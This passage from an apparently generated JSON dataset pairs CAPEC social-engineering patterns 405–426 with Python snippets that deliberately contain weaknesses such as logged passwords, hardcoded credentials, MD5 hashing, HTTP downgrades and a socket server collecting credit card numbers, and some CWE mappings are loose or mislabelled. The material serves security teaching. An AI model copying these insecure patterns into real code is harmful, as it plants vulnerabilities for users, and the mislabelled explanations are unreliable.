        "description": "This Python code snippet demonstrates several deprecated and vulnerable practices related to the CAPEC and CWEs provided. It logs sensitive information to a server log file (CWE-532), simulates an authentication bypass issue (CWE-287), stores sensitive data without encryption (CWE-493), and performs a DNS lookup that could be vulnerable to spoofing (CWE-350). The code highlights the importance of securing sensitive data, ensuring proper authentication mechanisms, and avoiding logging sensitive information."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "import socket\nimport logging\n\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n# CWE-532: Information Exposure Through Server Log Files\n# CWE-287: Authentication Bypass Issues\n\n# Configure logging\nlogging.basicConfig(filename='server.log', level=logging.INFO)\n\n# Function to check if a hostname is trusted\ndef is_trusted_host(hostname):\n    try:\n        # Perform DNS lookup\n        ip_address = socket.gethostbyname(hostname)\n        logging.info(f'Hostname {hostname} resolved to {ip_address}')\n        # Check if the IP address is in the trusted list (insecure check)\n        if ip_address in ['192.168.1.1', '192.168.1.2']:\n            return True\n        else:\n            return False\n    except socket.error as e:\n        logging.error(f'DNS lookup failed for {hostname}: {e}')\n        return False\n\n# Example usage\nhostname = 'example.com'\nif is_trusted_host(hostname):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a flawed security decision based on DNS lookups (CWE-350) and logs sensitive information (CWE-532). The function `is_trusted_host` performs a DNS lookup to resolve a hostname to an IP address and checks if the IP address is in a trusted list. This approach is insecure because DNS lookups can be spoofed, leading to potential authentication bypass issues (CWE-287). Additionally, the code logs the resolved IP addresses and errors to a server log file, which can expose sensitive information. This snippet embodies the deprecated CAPEC concept of social information gathering via research by showing how attackers might exploit such weaknesses to gather information and bypass security measures."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "import os\n\n# Simulate sensitive information stored in cleartext\nsensitive_info = 'User: admin, Password: admin123'\n\n# Write sensitive information to a file\nwith open('sensitive_data.txt', 'w') as file:\n    file.write(sensitive_info)\n\n# Simulate improper scrubbing of sensitive data\nos.remove('sensitive_data.txt')\n\n# Simulate exposure of core dump file\nwith open('core_dump.txt', 'w') as core_file:\n    core_file.write('Core dump data...')\n\n# Simulate exposure of version-control repository\nos.system('git init exposed_repo')\nwith open('exposed_repo/config', 'w') as config_file:\n    config_file.write('[core]\\n\trepositoryformatversion = 0\\n')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving' and associated CWEs. The code stores sensitive information in cleartext and writes it to a file, which is then deleted improperly, simulating the potential for data recovery from discarded files (CWE-316, CWE-1266). It also creates a core dump file and a version-control repository in accessible locations, representing the exposure of sensitive data to unauthorized actors (CWE-528, CWE-527). This snippet highlights the risks of improper data handling and disposal, which can be exploited by dumpster diving adversaries."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "import requests\n\nclass PretextingAttack:\n    def __init__(self, target_url, session_id):\n        self.target_url = target_url\n        self.session_id = session_id\n\n    def perform_attack(self):\n        # CWE-300: Channel Accessible by Non-Endpoint\n        headers = {'Authorization': f'Session {self.session_id}'}\n        response = requests.get(self.target_url, headers=headers)\n        if response.status_code == 200:\n            # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            sensitive_info = response.text\n            print(f'Exposed Sensitive Information: {sensitive_info}')\n        else:\n            print('Failed to retrieve information')\n\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\n# Simulating a fake login page to capture session ID\nfake_login_page = \"\"\"\n<html>\n<body>\n<form action=\"/login\" method=\"post\">\n    Username: <input type=\"text\" name=\"username\"><br>\n    Password: <input type=\"password\" name=\"password\"><br>\n    <input type=\"submit\" value=\"Login\">\n</form>\n</body>\n</html>\n\"\"\"\n\n# CWE-384: Session Fixation\n# Assuming the attacker has fixed the session ID\nfixed_session_id = 'attacker_session_id'\n\n# Perform the pretexting attack\nattack = PretextingAttack('http://example.com/sensitive_info', fixed_session_id)\nattack.perform_attack()",
        "description": "This Python code snippet demonstrates a pretexting attack where an attacker uses a fixed session ID to access sensitive information from a target URL. The code simulates a fake login page to capture user credentials (CWE-451) and uses a fixed session ID (CWE-384) to authenticate and retrieve sensitive information (CWE-200) from a server. The attack exploits the lack of proper identity verification in the communication channel (CWE-300). The main idea is to show how an attacker can manipulate a scenario to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "import logging\n\n# CWE-532: Information Exposure Through Log Files\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulated sensitive data\nuser_password = 'SuperSecretPassword123'\n\n# CWE-534: Information Exposure Through Debug Log Files\nlogging.debug(f'User password is: {user_password}')\n\n# CWE-766: Critical Data Modification\nstored_data = {'balance': 1000}\n\n# Simulated unauthorized modification\nstored_data['balance'] = 0\n\n# CWE-493: Failure to provide confidentiality for stored data\nprint(f'User balance: {stored_data['balance']}')",
        "description": "This Python code snippet demonstrates several deprecated CWEs related to information exposure and data protection. It sets up logging to a file (CWE-532) and logs sensitive information such as a user password (CWE-534). It also simulates the modification of critical stored data (CWE-766) and prints this data without ensuring its confidentiality (CWE-493). The code highlights the risks of logging sensitive information and failing to protect stored data from unauthorized access and modification."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "import logging\nimport os\n\n# Configure logging to write to a file\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulate storing sensitive data without encryption\nsensitive_data = 'user_password=12345'\n\n# Log sensitive data (CWE-532)\nlogging.debug(f'Storing sensitive data: {sensitive_data}')\n\n# Simulate a DNS lookup for a security decision (CWE-350)\ndef is_trusted_domain(domain):\n    trusted_domains = ['trusted.com']\n    return domain in trusted_domains\n\n# Use DNS lookup result in a security decision\nuser_domain = 'untrusted.com'\nif is_trusted_domain(user_domain):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates deprecated security practices that align with the deprecated CAPEC and related CWEs. The code logs sensitive information (user password) to a debug log file, which is a deprecated practice (CWE-532). Additionally, it makes a security decision based on a DNS lookup, which is another deprecated practice (CWE-350). The code highlights the importance of avoiding these insecure practices to protect sensitive data and make robust security decisions."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\ndef handle_client(client_socket):\n    # CWE-205: Observable Behavioral Discrepancy\n    # CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n    client_socket.send(b'Welcome to the secure server. Please provide your credentials.')\n    credentials = client_socket.recv(1024).decode('utf-8')\n    print(f'Received credentials: {credentials}')  # CWE-200: Sensitive information exposure\n\n    # CWE-222: Truncation of Security-relevant Information\n    if len(credentials) > 10:\n        credentials = credentials[:10]\n\n    # Simulate verification process\n    if credentials == 'admin1234':\n        client_socket.send(b'Access granted.')\n    else:\n        client_socket.send(b'Access denied.')\n\n    client_socket.close()\n\n# Simulate server setup\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind(('0.0.0.0', 9999))\nserver.listen(5)\nprint('Server listening on port 9999...')\n\nwhile True:\n    client_socket, addr = server.accept()\n    handle_client(client_socket)",
        "description": "This Python code snippet demonstrates a simple server-client interaction where the server improperly verifies the source of a communication channel (CWE-940) and exposes sensitive information (CWE-200). The server prompts the client for credentials and prints them directly, exposing sensitive information. Additionally, the server truncates the credentials if they exceed a certain length (CWE-222), potentially obscuring important security-relevant information. The server's behavior can be observed and exploited by an attacker (CWE-205, CWE-207). This code embodies the main idea of CAPEC-419 (Information Elicitation) by showing how an adversary could extract sensitive information through improper handling and verification of communication channels."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "import logging\n\n# Setup logging\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulate sensitive information\nuser_password = 'SuperSecretPassword123'\n\n# Log sensitive information (vulnerable practice)\nlogging.debug(f'User password: {user_password}')\n\n# Simulate an authentication check\ndef authenticate(user_input):\n    if user_input == user_password:\n        return 'Access Granted'\n    else:\n        return 'Access Denied'\n\n# User input simulation\nuser_input = 'WrongPassword'\nprint(authenticate(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable practice related to the deprecated CAPEC-407 (Social Information Gathering via Pretexting) and related CWEs, particularly CWE-532 (Information Exposure Through Log Files). The code sets up logging and logs sensitive information (a user's password) in a debug log file. This practice can lead to information exposure if the log files are accessed by unauthorized individuals. Additionally, the code includes a simple authentication function that checks the user input against the logged password, illustrating how sensitive information can be mishandled and exposed."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "import socket\n\nclass CustomerServiceSimulator:\n    def __init__(self, host='localhost', port=12345):\n        self.server_address = (host, port)\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind(self.server_address)\n        self.server_socket.listen(1)\n\n    def start(self):\n        print('Customer Service Simulator started. Waiting for connections...')\n        while True:\n            connection, client_address = self.server_socket.accept()\n            try:\n                print(f'Connection from {client_address}')\n                connection.sendall(b'Welcome to Customer Service. Please provide your credit card number for verification: ')\n                data = connection.recv(1024)\n                print(f'Received credit card number: {data.decode()}')\n            finally:\n                connection.close()\n\nif __name__ == '__main__':\n    simulator = CustomerServiceSimulator()\n    simulator.start()",
        "description": "This Python code snippet simulates a customer service representative engaging in pretexting behavior. The server listens for incoming connections and, upon connection, prompts the user to provide their credit card number. This embodies the CAPEC 'Pretexting via Customer Service' by simulating an adversary soliciting sensitive information under the guise of a legitimate customer service interaction. The code demonstrates several related CWEs: it does not verify the source of the communication (CWE-940), allows access to sensitive information without proper endpoint verification (CWE-300), and exposes sensitive information to unauthorized actors (CWE-200)."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "import os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-1263: Improper Physical Access Control\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n\ndef handle_tech_support_request(user_input):\n    # Simulate a tech support request handling\n    if 'password' in user_input.lower():\n        # CWE-200 and CWE-359: Exposing sensitive information\n        sensitive_info = \"User's password: 12345\"\n        print(sensitive_info)\n        \n        # CWE-538: Inserting sensitive information into an externally accessible file\n        with open('public_info.txt', 'w') as file:\n            file.write(sensitive_info)\n\n    # CWE-434: Allowing upload of dangerous file type\n    if 'upload' in user_input.lower():\n        file_path = 'uploaded_file.exe'  # Dangerous file type\n        with open(file_path, 'wb') as file:\n            file.write(b'...')  # Simulate file upload\n        print(f'File {file_path} uploaded successfully.')\n\n    # CWE-1263: Improper physical access control\n    if 'access' in user_input.lower():\n        print('Granting physical access to the system.')\n        os.system('echo Physical access granted')\n\n# Example usage\nhandle_tech_support_request('Please reset my password')\nhandle_tech_support_request('I need to upload a file')\nhandle_tech_support_request('Can I have access to the server room?')",
        "description": "This Python code snippet simulates a tech support scenario where an adversary can exploit various vulnerabilities. The function `handle_tech_support_request` processes user input and demonstrates the following vulnerabilities:\n\n1. **CWE-200 and CWE-359**: Exposing sensitive information (e.g., passwords) to unauthorized actors and writing it to a publicly accessible file.\n2. **CWE-434**: Allowing the upload of a dangerous file type (e.g., an executable file).\n3. **CWE-1263**: Granting physical access to the system without proper authorization.\n\nThe code represents the main idea of the CAPEC by showing how an adversary posing as tech support can solicit sensitive information, upload dangerous files, and gain physical access to a system, leading to potential security breaches."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "import os\nimport shutil\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-433: Unparsed Raw Web Content Delivery\n# CWE-1292: Incorrect Conversion of Security Identifiers\n\ndef impersonate_delivery_person(target_directory, sensitive_file):\n    # CWE-941: Incorrectly specified destination\n    destination = '/tmp/'  # Incorrect destination, should be a secure location\n    \n    # CWE-538: Insertion of sensitive information into externally-accessible directory\n    sensitive_info = 'Sensitive Data: User credentials, API keys, etc.'\n    with open(os.path.join(destination, 'sensitive_info.txt'), 'w') as f:\n        f.write(sensitive_info)\n    \n    # CWE-300: Channel accessible by non-endpoint\n    if not os.path.exists(target_directory):\n        os.makedirs(target_directory)\n    shutil.copy(os.path.join(destination, 'sensitive_info.txt'), target_directory)\n    \n    # CWE-433: Unparsed raw web content delivery\n    with open(os.path.join(target_directory, 'raw_content.html'), 'w') as f:\n        f.write('<html><body>Raw Content</body></html>')\n    \n    # CWE-1292: Incorrect conversion of security identifiers\n    try:\n        security_id = int('not_a_number')  # Incorrect conversion\n    except ValueError:\n        security_id = 0  # Fallback to a default insecure ID\n    \n    print(f'Impersonation complete. Security ID: {security_id}')\n\n# Example usage\nimpersonate_delivery_person('/var/www/html', 'sensitive_info.txt')",
        "description": "This Python code snippet demonstrates a scenario where an adversary impersonates a delivery person to manipulate a target system. The code includes several vulnerabilities that align with the provided CAPEC and CWEs:\n\n1. **CWE-941**: The destination for storing sensitive information is incorrectly specified as '/tmp/', which is not secure.\n2. **CWE-538**: Sensitive information is written to a file in an externally-accessible directory.\n3. **CWE-300**: The code does not adequately verify the identity of actors accessing the communication channel, allowing unauthorized access.\n4. **CWE-433**: Raw web content is delivered without proper parsing or handling, making it accessible under the web document root.\n5. **CWE-1292**: Incorrect conversion of security identifiers, leading to potential unauthorized access.\n\nThe code represents the main idea of the CAPEC by showing how an adversary can exploit these vulnerabilities to gain unauthorized access and manipulate the target system."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "import random\n\nclass PhoneSystem:\n    def __init__(self):\n        self.employees = {'Alice': '1234', 'Bob': '5678'}\n        self.help_desk = '9999'\n\n    def verify_identity(self, caller_id):\n        # CWE-940: Improper Verification of Source of a Communication Channel\n        if caller_id in self.employees.values() or caller_id == self.help_desk:\n            return True\n        return False\n\n    def handle_call(self, caller_id, request):\n        if self.verify_identity(caller_id):\n            # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            if request == 'get_employee_info':\n                return self.employees\n            elif request == 'reset_password':\n                return 'Password reset link sent'\n        else:\n            return 'Unauthorized access attempt'\n\n# Simulating a pretexting attack\nphone_system = PhoneSystem()\n\n# Adversary impersonates help desk\nadversary_caller_id = '9999'\nrequest = 'get_employee_info'\n\n# CWE-300: Channel Accessible by Non-Endpoint\nresponse = phone_system.handle_call(adversary_caller_id, request)\nprint(response)",
        "description": "This Python code snippet simulates a phone system that handles calls and verifies the identity of the caller based on their caller ID. The `verify_identity` method checks if the caller ID matches any known employee or the help desk. If the verification passes, the system processes the request, which could involve exposing sensitive information or performing actions like password resets. The code demonstrates vulnerabilities such as improper verification of the source of a communication channel (CWE-940) and exposure of sensitive information to unauthorized actors (CWE-200). An adversary can exploit these weaknesses by impersonating a trusted entity, such as the help desk, to gain unauthorized access to sensitive information, embodying the main idea of the CAPEC 'Pretexting via Phone'."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "import time\n\nclass HelpDesk:\n    def __init__(self):\n        self.sensitive_info = 'User: John Doe, Password: secret123'\n        self.request_count = 0\n\n    def handle_request(self, request):\n        self.request_count += 1\n        if self.request_count > 5:\n            print('Too many requests. Please try again later.')\n            return\n        if 'supervisor' in request:\n            print('Access granted. Sensitive info:', self.sensitive_info)\n        else:\n            print('Access denied.')\n\n# Simulating social engineering attack\nhelp_desk = HelpDesk()\nrequests = [\n    'I am a supervisor, please provide the info.',\n    'I am a supervisor, please provide the info.',\n    'I am a supervisor, please provide the info.',\n    'I am a supervisor, please provide the info.',\n    'I am a supervisor, please provide the info.',\n    'I am a supervisor, please provide the info.'\n]\n\nfor req in requests:\n    help_desk.handle_request(req)\n    time.sleep(1)",
        "description": "This Python code snippet simulates a help desk system that can be manipulated through social engineering. The HelpDesk class contains sensitive information and a method to handle requests. The handle_request method checks if the request contains the word 'supervisor' to grant access to sensitive information, representing CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). The request_count attribute and its check represent CWE-799 (Improper Control of Interaction Frequency), limiting the number of requests to prevent abuse. The code demonstrates how an adversary might exploit human behavior by pretending to be a supervisor to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "import hashlib\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# CWE-656: Reliance on Security Through Obscurity\n# CWE-205: Observable Behavioral Discrepancy\n# CWE-222: Truncation of Security-relevant Information\n# CWE-301: Reflection Attack in an Authentication Protocol\n\n# Simulated user database\nusers = {\n    'user1': '5f4dcc3b5aa765d61d8327deb882cf99'  # 'password' hashed with MD5\n}\n\n# Function to simulate a login process\ndef login(username, password):\n    # CWE-654: Single factor authentication\n    if username in users and users[username] == hashlib.md5(password.encode()).hexdigest():\n        return True\n    return False\n\n# Function to simulate a social engineering attack\ndef social_engineering_attack():\n    # CWE-656: Security through obscurity\n    print(\"Simulating social engineering attack...\")\n    # Adversary convinces the user to reveal their password\n    victim_password = 'password'  # In a real scenario, this would be obtained through social engineering\n    # CWE-301: Reflection attack\n    if login('user1', victim_password):\n        print(\"Access granted to adversary!\")\n    else:\n        print(\"Access denied.\")\n\n# Simulate the attack\nsocial_engineering_attack()",
        "description": "This Python code snippet demonstrates a social engineering attack where an adversary influences a user's perception to gain unauthorized access. The code uses a simple login function that relies on single-factor authentication (CWE-654) and security through obscurity (CWE-656) by using MD5 hashing for passwords. The social engineering attack function simulates an adversary convincing a user to reveal their password, which is then used to gain access. This example highlights the vulnerabilities associated with relying on a single factor for security decisions and the risks of using weak protection mechanisms."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n\ndef create_socket_connection(host, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        return s\n    except Exception as e:\n        print(f\"Connection error: {e}\")\n        return None\n\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-222: Truncation of Security-relevant Information\n\ndef authenticate(s, username, password):\n    try:\n        s.sendall(f\"AUTH {username} {password}\\n\".encode())\n        response = s.recv(1024).decode()\n        if response.startswith(\"OK\"):\n            print(\"Authenticated successfully!\")\n        else:\n            print(\"Authentication failed.\")\n    except Exception as e:\n        print(f\"Authentication error: {e}\")\n\n# Main function to demonstrate the vulnerability\nif __name__ == \"__main__\":\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    target_host = \"example.com\"  # This could be influenced by an attacker\n    target_port = 12345\n\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    s = create_socket_connection(target_host, target_port)\n    if s:\n        # CWE-301: Reflection Attack in an Authentication Protocol\n        # CWE-222: Truncation of Security-relevant Information\n        authenticate(s, \"user\", \"pass\")\n        s.close()",
        "description": "This Python code snippet demonstrates a vulnerable communication and authentication process, embodying the main idea of the CAPEC 'Influence Perception of Reciprocation'. The code creates a socket connection to a specified host and port, which could be influenced by an attacker (CWE-941). It does not properly verify the source of the communication channel (CWE-940) and establishes a connection that could be accessed by a non-endpoint (CWE-300). The authentication function sends credentials without proper security measures, making it susceptible to reflection attacks (CWE-301) and potentially truncating security-relevant information (CWE-222). This setup can be exploited by an adversary using social engineering techniques to manipulate the target into revealing sensitive information or performing certain actions."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "import requests\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation\n# CWE-203: Observable Discrepancy\n\n# Simulate a function that sends sensitive data to a specified URL\n# The URL is incorrectly specified, leading to potential data leakage\n# Additionally, the function uses a less secure algorithm for encryption\n\ndef send_sensitive_data(data, url):\n    # Incorrectly specified destination (CWE-941)\n    incorrect_url = url.replace('https', 'http')  # Downgrade to less secure protocol\n    \n    # Observable discrepancy (CWE-203)\n    if 'sensitive' in data:\n        print('Sending sensitive data...')\n    else:\n        print('Sending regular data...')\n    \n    # Simulate sending data\n    response = requests.post(incorrect_url, data=data)\n    return response.status_code\n\n# Example usage\nsensitive_data = 'sensitive information'\nresponse_code = send_sensitive_data(sensitive_data, 'https://secure.example.com')\nprint(f'Response Code: {response_code}')",
        "description": "This Python code snippet demonstrates a vulnerable function `send_sensitive_data` that embodies the main idea of the deprecated CAPEC 'Target Influence via Perception of Concession' and related CWEs. The function is designed to send sensitive data to a specified URL but contains several vulnerabilities:\n\n1. **CWE-941: Incorrectly Specified Destination in a Communication Channel** - The URL is incorrectly specified by downgrading the protocol from HTTPS to HTTP, leading to potential data leakage.\n2. **CWE-757: Selection of Less-Secure Algorithm During Negotiation** - The function uses a less secure protocol (HTTP) instead of HTTPS, which is a more secure algorithm for data transmission.\n3. **CWE-203: Observable Discrepancy** - The function prints different messages based on the type of data being sent, which can be observed by an unauthorized actor to infer the nature of the data.\n\nThe code represents the idea of influencing the target's perception by introducing observable discrepancies and using less secure communication methods, which can be exploited by attackers."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "import time\n\nclass ScarcityInfluence:\n    def __init__(self):\n        self.resources = 10  # Limited resource\n\n    def check_availability(self):\n        if self.resources > 0:\n            return True\n        return False\n\n    def request_resource(self, user):\n        if self.check_availability():\n            self.resources -= 1\n            print(f'Resource allocated to {user}. Remaining resources: {self.resources}')\n        else:\n            print('No resources available. Please try again later.')\n\n    def create_urgency(self, user):\n        print(f'Attention {user}: Only {self.resources} resources left! Act now!')\n        self.request_resource(user)\n\n# Simulate user interaction\nscarcity = ScarcityInfluence()\nusers = ['Alice', 'Bob', 'Charlie']\nfor user in users:\n    scarcity.create_urgency(user)\n    time.sleep(1)  # Simulate time delay to create urgency",
        "description": "This Python code snippet demonstrates the concept of 'Influence Perception of Scarcity' by simulating a scenario where a limited resource is available. The `ScarcityInfluence` class manages a finite number of resources and includes methods to check availability, request resources, and create a sense of urgency. The `create_urgency` method informs the user of the limited resources and prompts them to act quickly, embodying the CAPEC's main idea. The code also touches on related CWEs: it relies on a single factor (resource count) for decision-making (CWE-654), and the urgency message could lead to observable behavioral discrepancies (CWE-205)."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-654: Reliance on a Single Factor in a Security Decision\n\ndef impersonate_authority(target_ip, target_port):\n    try:\n        # Create a socket connection to the target\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((target_ip, target_port))\n\n        # CWE-654: Reliance on a Single Factor in a Security Decision\n        # Send a message impersonating an authority figure\n        authority_message = \"ADMIN: Please provide your credentials for verification.\"\n        s.sendall(authority_message.encode('utf-8'))\n\n        # Receive the response from the target\n        response = s.recv(1024)\n        print(f\"Received: {response.decode('utf-8')}\")\n\n        s.close()\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n\n# Example usage\nimpersonate_authority('192.168.1.10', 8080)",
        "description": "This Python code snippet demonstrates a simple example of impersonating an authority figure to influence a target to reveal sensitive information, embodying the main idea of the CAPEC 'Influence Perception of Authority'. The code creates a socket connection to a target IP and port, then sends a message impersonating an administrator requesting credentials. This leverages CWE-654 by relying on a single factor (the message) to convince the target. The code also touches on CWE-300 and CWE-940 by not verifying the identity of the communication channel's endpoints, allowing an adversary to potentially exploit the connection."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "import requests\n\nclass SocialEngineer:\n    def __init__(self, target_url):\n        self.target_url = target_url\n        self.session = requests.Session()\n\n    def minor_request(self):\n        response = self.session.get(f'{self.target_url}/minor_task')\n        if response.status_code == 200:\n            print('Minor task completed')\n            return True\n        return False\n\n    def major_request(self):\n        response = self.session.get(f'{self.target_url}/major_task')\n        if response.status_code == 200:\n            print('Major task completed')\n            return True\n        return False\n\n    def execute(self):\n        if self.minor_request():\n            self.major_request()\n\n# Example usage\nse = SocialEngineer('http://example.com')\nse.execute()",
        "description": "This Python code snippet demonstrates a simplified social engineering attack where an adversary first makes a minor request to a target URL and, upon successful completion, follows up with a major request. The 'SocialEngineer' class uses the 'requests' library to interact with the target. The 'execute' method first calls 'minor_request' and, if successful, proceeds to call 'major_request'. This embodies the CAPEC idea of influencing perception of commitment and consistency by starting with a minor task to increase the likelihood of compliance with a subsequent larger task. The code also touches on related CWEs, such as improper control of interaction frequency (CWE-799) by not limiting the number of requests, and observable discrepancy (CWE-203) by revealing the success of operations through status codes."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "import hashlib\n\nclass AuthenticationSystem:\n    def __init__(self):\n        self.users = {'trusted_user': '5f4dcc3b5aa765d61d8327deb882cf99'}  # md5 for 'password'\n        self.session_tokens = {}\n\n    def authenticate(self, username, password):\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if username in self.users and self.users[username] == hashed_password:\n            token = self.generate_token(username)\n            self.session_tokens[username] = token\n            return token\n        return None\n\n    def generate_token(self, username):\n        return hashlib.md5(username.encode()).hexdigest()\n\n    def access_resource(self, token):\n        for user, user_token in self.session_tokens.items():\n            if user_token == token:\n                return f\"Access granted to {user}\"\n        return \"Access denied\"\n\n# Adversary impersonates a trusted user\nsystem = AuthenticationSystem()\ntrusted_token = system.authenticate('trusted_user', 'password')\nprint(system.access_resource(trusted_token))  # Access granted to trusted_user\n\n# Adversary uses reflection attack to gain access\nadversary_token = system.generate_token('trusted_user')\nprint(system.access_resource(adversary_token))  # Access granted to trusted_user",
        "description": "This Python code snippet demonstrates an authentication system vulnerable to several weaknesses described in the CAPEC and related CWEs. The system uses MD5 hashing for passwords (CWE-327: Use of a Broken or Risky Cryptographic Algorithm) and relies on a single factor (username and password) for authentication (CWE-654: Reliance on a Single Factor in a Security Decision). The `generate_token` method creates session tokens based on the username, which can be exploited by an adversary to impersonate a trusted user (CWE-301: Reflection Attack in an Authentication Protocol). The code also demonstrates how an adversary can gain access by generating a token for a trusted user, highlighting the vulnerability in the authentication mechanism."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "import random\n\nclass VotingSystem:\n    def __init__(self):\n        self.votes = {'A': 0, 'B': 0}\n        self.user_votes = {}\n\n    def vote(self, user, choice):\n        if user in self.user_votes:\n            print(\"User has already voted.\")\n            return\n        if choice not in self.votes:\n            print(\"Invalid choice.\")\n            return\n        self.user_votes[user] = choice\n        self.votes[choice] += 1\n        self.influence_perception()\n\n    def influence_perception(self):\n        # Simulate influencing perception by showing skewed results\n        total_votes = sum(self.votes.values())\n        if total_votes == 0:\n            return\n        skew_factor = random.uniform(0.1, 0.3)\n        for choice in self.votes:\n            perceived_votes = self.votes[choice] + int(self.votes[choice] * skew_factor)\n            print(f\"Perceived votes for {choice}: {perceived_votes}\")\n\n# Example usage\nvoting_system = VotingSystem()\nvoting_system.vote('user1', 'A')\nvoting_system.vote('user2', 'B')\nvoting_system.vote('user3', 'A')",
        "description": "This Python code snippet represents a simple voting system where users can vote for choices 'A' or 'B'. The system keeps track of votes and users who have voted. The 'influence_perception' method is used to simulate the influence of perception by showing skewed results to the users. This method adds a random skew factor to the actual votes, making it appear as though there are more votes for each choice than there actually are. This leverages the CAPEC concept of influencing the target's actions by manipulating their perception of consensus or social proof. The code also demonstrates CWE-205 and CWE-203 by showing observable discrepancies in the voting results, and CWE-654 by relying on a single factor (user vote) for the voting decision."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "import requests\n\nclass FramingInfluence:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def send_request(self, data):\n        # CWE-941: Incorrectly Specified Destination in a Communication Channel\n        # CWE-300: Channel Accessible by Non-Endpoint\n        response = requests.post(self.target_url, json=data)\n        return response\n\n    def influence_target(self, data):\n        # CWE-654: Reliance on a Single Factor in a Security Decision\n        # CWE-451: User Interface (UI) Misrepresentation of Critical Information\n        if 'important_key' in data:\n            data['important_key'] = 'framed_value'\n        return self.send_request(data)\n\n# Example usage\nframer = FramingInfluence('http://example.com/api')\ndata = {'important_key': 'original_value', 'other_key': 'some_value'}\nresponse = framer.influence_target(data)\nprint(response.status_code)",
        "description": "This Python code snippet demonstrates a simplified version of 'Target Influence via Framing' by manipulating data before sending it to a target URL. The `FramingInfluence` class is initialized with a target URL and has two main methods: `send_request` and `influence_target`. The `send_request` method sends a POST request to the specified URL, potentially suffering from CWE-941 (Incorrectly Specified Destination in a Communication Channel) and CWE-300 (Channel Accessible by Non-Endpoint) vulnerabilities. The `influence_target` method modifies the data to frame the target's perspective, embodying CWE-654 (Reliance on a Single Factor in a Security Decision) and CWE-451 (User Interface (UI) Misrepresentation of Critical Information) by altering critical information before sending it. This code represents the main idea of CAPEC by showing how an adversary might frame data to influence a target's decision-making process."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
